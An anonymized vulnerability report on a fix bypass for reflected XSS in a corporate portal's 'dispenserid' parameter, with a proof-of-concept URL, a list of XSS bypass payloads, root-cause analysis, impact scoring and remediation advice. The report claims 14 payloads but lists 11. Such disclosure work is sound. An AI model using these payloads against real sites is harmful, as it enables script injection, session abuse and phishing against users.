🛡️ Vulnerability Report – Fix Bypass: Persistent Reflected XSS via dispenserid Parameter in Authenticated Web Portal
📌 Affected Asset
Authenticated Corporate Portal – *.example-corp.com

🔍 Vulnerable Component
GET parameter: dispenserid  
Endpoint: /resources/?dispenserid=

🧠 Executive Summary

This report documents a fix bypass of a previously closed Reflected XSS vulnerability in the dispenserid parameter of a corporate web portal. Although the original issue was marked as resolved, multiple payloads confirm that no proper server-side sanitization or output encoding was implemented.

The vulnerability affects authenticated users inside a corporate environment and enables the execution of arbitrary JavaScript, allowing full control over the UI, manipulation of user sessions, and phishing within a trusted domain context.

✅ This is not a duplicate but a regression vulnerability, demonstrating that the initial fix was incomplete or ineffective.

🎯 Proof of Concept (PoC)
🔍 Primary Payload
https://www.example-corp.com/resources/?dispenserid=%22%3E%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60demo%60%29%3E


🔎 Observed Behavior:
A JavaScript alert("demo") is triggered inside the authenticated session.

📜 Additional Working Payloads (14 Total)

Each of these payloads bypasses the previously implemented fix, confirming the vulnerability is systemic:

"><script akdk>prompt(document.domain)</script akdk>
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<!--<img src="--><img src=x onerror=javascript:alert(/AmoloHT/)//">
#"><img src=/ onerror=alert(2)>
"><input autofocus onfocus=top[(584390752*16).toString(30)](/XSS/)>
`"'><img src='#\x27 onerror=javascript:alert(1)>
"><img src=x alt=x onerror=prompt(document.domain);>
"><img src="x" onerror=alert(1337) />
"><img src=x onerror=prompt(1);>
#"><img src=x onerror=prompt(document.domain);>
"><img src=x style=content:'x' onerror=prompt(document.domain);>


📸 Screenshots included confirm:

JS execution inside the authenticated portal
Console errors related to broken HTML injection
DOM manipulation through payload injection

🔍 Root Cause Analysis
❌ Why the Previous Fix Failed

The backend continues to insert unsanitized input from $_GET['dispenserid'] directly into HTML.

Parameters like $dispenserid are used in server-side templates:

template-resources.php
circles.php
header-dispensers.php

🚨 Observed Vulnerable Behaviors

No output encoding (htmlspecialchars, etc.)
No input sanitization
No Content-Security-Policy (CSP)

Likely client-side filtering only in the previous patch

💥 Impact Analysis

This is a high-severity vulnerability due to execution within an authenticated user context in a corporate environment.

Impact Category	Description
🎯 Authenticated JS Execution	XSS runs after login, scoped to internal users
🎭 UI Phishing / Spoofing	Injection of fake forms or redirects inside trusted UI
🔄 Forced User Actions	XSS can automate UI events (CSRF-through-context)
🔐 Session Abuse	While cookies are HttpOnly, session actions can still be hijacked
📊 Multiple Working Payloads	Confirms systemic failure, not isolated edge case
⚠️ Reopened Regression	Fix bypasses are treated with higher severity than initial reports
🧪 Severity Justification
Factor	Risk Level
Executed in logged-in session	✅ High
Exploitable via simple URL	✅ High
Multiple payloads succeed	✅ High
Internal-facing corporate portal	✅ High
Proof of regression	✅ Critical in bug bounty/SDLC terms

Estimated CVSS v3.1 Score: 8.2 – High

✅ Recommended Remediation
🧼 1. Server-Side Input Validation

Reject or strictly sanitize all dispenserid values. If a fixed format is expected (e.g., alphanumeric ID), enforce regex matching:

if (!preg_match('/^[a-zA-Z0-9_-]{1,30}$/', $_GET['dispenserid'])) {
    http_response_code(400);
    exit;
}

🔐 2. HTML Output Encoding

All dynamic variables rendered in HTML must be escaped:

echo htmlspecialchars($dispenserid, ENT_QUOTES, 'UTF-8');

📜 3. Enforce a Strong Content Security Policy (CSP)

Add the following HTTP header:

Content-Security-Policy: script-src 'self'; object-src 'none';


Prevents inline or injected scripts from executing unless explicitly allowed.

⚙️ 4. Use Auto-Escaping Templates or Libraries

Adopt frameworks or template engines that enforce automatic HTML escaping:

Twig
React (JSX auto-escapes by default)
OWASP Java Encoder for server-side rendering

✅ Verification

After applying the patch:

Re-test each PoC URL
Confirm no script execution occurs
Ensure the application returns encoded content or 400 Bad Request on invalid input
Validate CSP is in place with browser DevTools → Network → Headers

📚 References

OWASP XSS Prevention Cheat Sheet
Mozilla CSP Guide
PHP: htmlspecialchars()

Google Web Security – Output Encoding

📓 Report Metadata
Field	Description
Vulnerability Type	Reflected Cross-Site Scripting (XSS)
Vulnerability Class	Fix Bypass / Regression
Affected Parameter	dispenserid
Exploitation Context	Authenticated session
Severity (CVSS v3.1 est)	8.2 – High
PoC Payloads Tested	14
Previous Fix Status	Marked as "Fixed" – proven bypassed
Disclosure Type	Responsible – anonymized for public sharing
✍️ Methodology

This vulnerability was discovered by revalidating a previously closed XSS report. The tester:

Reviewed previous patch behavior
Manually fuzzed the dispenserid parameter
Confirmed HTML injection persisted
Validated script execution inside the authenticated context
Created a set of bypass payloads
Documented evidence and performed root cause tracing through server-rendered code

✅ This approach aligns with real-world red teaming, validating the integrity of applied fixes and demonstrating a mature security testing methodology.

✅ Conclusion

This report highlights the risks of incomplete or cosmetic fixes in production applications. It demonstrates a high-severity reflected XSS vulnerability within a corporate authenticated environment, with confirmed bypass of the previous fix and multiple working payloads.

By applying the recommendations in this report, the platform can eliminate the vulnerable code path and reduce the risk of internal phishing, session abuse, and UI hijacking.

📢 Note: This report has been fully anonymized for educational and portfolio purposes only. It reflects real-world methodology and ethical exploitation practices.
